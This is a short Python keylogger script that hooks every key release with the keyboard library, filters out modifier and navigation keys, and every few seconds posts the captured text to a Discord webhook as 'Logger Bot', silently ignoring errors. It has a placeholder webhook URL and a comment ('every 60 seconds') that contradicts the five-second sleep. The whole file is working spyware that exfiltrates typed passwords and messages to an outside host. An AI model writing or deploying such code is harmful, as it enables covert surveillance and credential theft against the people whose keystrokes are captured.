import keyboard
import requests
import threading
import time

log = ""
log_lock = threading.Lock()

# Your Discord webhook
webhook_url = 'your webhook'

# List of keys to ignore
ignored_keys = {
    'ctrl', 'ctrl_l', 'ctrl_r',
    'shift', 'shift_l', 'shift_r',
    'alt', 'alt_l', 'alt_r',
    'caps lock', 'tab', 'backspace',
    'esc', 'enter', 'windows',
    'up', 'down', 'left', 'right',
    'menu', 'insert', 'delete',
    'home', 'end', 'page up', 'page down',
    'num lock', 'scroll lock', 'print screen',
    'pause', 'media play/pause', 'volume up', 'volume down'
}

def on_key(event):
    global log
    key = event.name

    # Ignore unwanted keys
    if key.lower() in ignored_keys:
        return

    if key == "space":
        key = " "

    # Add character to the log
    with log_lock:
        log += key

def send_to_discord():
    global log
    while True:
        time.sleep(5)  # Send every 60 seconds
        with log_lock:
            if log.strip():
                data = {
                    "content": f"```\n{log}\n```",
                    "username": "Logger Bot"
                }
                try:
                    requests.post(webhook_url, json=data)
                except Exception:
                    pass  # Ignore sending errors
                log = ""  # Clear log after sending

# Start keylogger and background sender
keyboard.on_release(callback=on_key)
threading.Thread(target=send_to_discord, daemon=True).start()

# Keep script alive
keyboard.wait()
